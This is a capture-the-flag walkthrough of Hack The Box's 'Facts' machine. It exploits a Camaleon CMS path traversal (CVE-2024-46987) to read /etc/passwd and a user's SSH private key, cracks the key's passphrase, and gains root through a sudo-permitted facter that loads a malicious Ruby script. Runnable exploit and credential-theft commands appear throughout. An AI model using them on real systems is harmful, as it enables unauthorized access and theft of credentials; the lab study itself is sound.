## Summary Exploitation
The Facts machine on Hack The Box was an engaging easy-level challenge that combined web exploitation with a unique privilege escalation vector. After performing initial reconnaissance with Nmap and directory fuzzing, I discovered a Camaleon CMS instance. By exploiting a Path Traversal vulnerability (CVE-2024-46987) in the media controller, I was able to leak a passphrase-protected SSH private key for the user trivia. After successfully cracking the passphrase with John the Ripper, I gained initial access. Further local enumeration revealed a sudo misconfiguration involving the facter binary, which I exploited by loading a malicious custom Ruby script to escalate my privileges to root.

## Initial Access
### Attack Strategy
So, we will use CVE-2024-46987 to get a sensitive files from the server.

### Technical Breakdown
The vulnerability exist when the application doesn't sanitize `../` and this allow the user to fetch any files outside the intended directory.

In `MediaController`, the `download_private_file` method is responsible for serving files:
```
def download_private_file
  cama_uploader.enable_private_mode!

  file = cama_uploader.fetch_file(&quot;private/#{params[:file]}&quot;)

  send_file file, disposition: &apos;inline&apos;
end
```
When the code executes `cama_uploader.fetch_file("private/#{params[:file]}")`, it creates a string. If a user provides `../../../../etc/passwd`, the string becomes
`private/../../../../etc/passwd`

The `CamaleonCmsLocalUploader` class is then asked to fetch this file. Its only defense mechanism is a simple existence check:
```
def fetch_file(file_name)
  raise ActionController::RoutingError, &apos;File not found&apos; unless file_exists?(file_name)

  file_name
end
```

That's how we can fetch other files in the server. More details on [CVE-2024-46987 (camaleon_cms): Camaleon CMS vulnerable to arbitrary path traversal](https://rubysec.com/advisories/CVE-2024-46987/)

### Proof Of Concept
```
python3 CVE-2024-46987.py -u http://facts.htb -l test -p test /etc/passwd
```
![passwd](/assets/img/facts/image%207.png)

From this, we found 2 users that available in the machine, `trivia` and `william`. These are our primary targets for gaining a foothold on the machine.

### SSH Key Extraction
To move forward, we can check if either user has an SSH private key stored in their home directory. By default, these keys are located at `/home/<user>/.ssh/id_ed25519`. If we can successfully fetch a private key using our LFI vulnerability, we can use it to log in directly via SSH.
```
python3 CVE-2024-46987.py -u http://facts.htb -l test -p test /home/trivia/.ssh/id_ed25519
```
![ssh key](/assets/img/facts/image%209.png)

Bingo! Copy the key to our machine.

### Cracking the Encrypted Key
After fetching the key, we attempted to log in but found that the key is encrypted with a passphrase.

![ssh login](/assets/img/facts/image%2010.png)

To bypass this, we used `ssh2john` to extract the hash and john to crack it using the `rockyou.txt` wordlist.
```
ssh2john id_ed25519 > id_trivia.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_trivia.hash
```
![cracked passphrase](/assets/img/facts/image%2011.png)

Found passphrase: `dragonballz`

### User Flag
With the passphrase in hand, we set the correct permissions for the key and established an SSH session.
```
chmod 600 id_ed25519
ssh -i id_ed25519 trivia@facts.htb
```
![user flag](/assets/img/facts/image%2012.png)

## Privilege Escalation
### Local Enumeration
Try to run linpeas first.

![linpeas result](/assets/img/facts/image%2013.png)

The result shows that we can run the facter as root. We can abuse the feature that facter have to get the root shell.

```
sudo /usr/bin/facter --help
```
![linpeas result](/assets/img/facts/image%2014.png)

### Technical Breakdown
Facter is designed to be extensible. If facter doesn't know a specific detail you need, it allows you to write your own ruby scripts.

The security flaw here is a Privilege Escalation via Arbitrary Code Execution. Because the `trivia` user has `sudo` permissions to run the facter binary as `root`, we can use the `--custom-dir` flag to point the application toward a directory containing a malicious Ruby script. Since Facter runs with root privileges, it will execute our script and any system commands inside it as the root user.

### Proof Of Concept
First, we create a temporary directory and a Ruby script that executes a bash shell. Then, we trigger the execution using the `--custom-dir` flag with sudo
```
trivia@facts:/tmp$ mkdir facter-exploit
trivia@facts:/tmp$ echo 'exec("/bin/bash")' > /tmp/facter-exploit/root.rb
trivia@facts:/tmp$ sudo /usr/bin/facter --custom-dir facter-exploit/
```
